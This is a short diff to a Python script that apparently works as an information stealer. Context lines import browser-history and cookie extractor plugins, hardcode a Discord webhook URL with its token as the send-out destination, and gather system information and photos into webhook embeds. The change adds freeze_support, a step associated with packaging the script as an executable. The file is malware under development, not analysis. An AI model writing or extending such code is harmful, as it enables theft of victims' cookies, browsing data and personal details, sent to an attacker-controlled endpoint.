@@ -12,6 +12,7 @@ from plugins.history import BrowserDataExtractor
 from plugins.cookies import CookieExtractor
 from plugins.print import Sprint, save_image
 from datetime import datetime
+from multiprocessing import freeze_support
 
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'
 webhook_avatar = "https://cdn.discordapp.com/attachments/1284297215770234900/1284297297223487552/image.png?ex=66e61e90&is=66e4cd10&hm=e8a738f0ab2a7ec1859cf40150a5e768604cc3d19479c8f0000e19334915953a&"
@@ -191,6 +192,7 @@ def criar_embed_com_imagens(caminho_foto1, caminho_foto2):
     }
 
 if __name__ == "__main__":
+    freeze_support()
     try:
         if not executou_informacoes_sistema:
             informacoes_sistema = obter_informacoes_sistema()
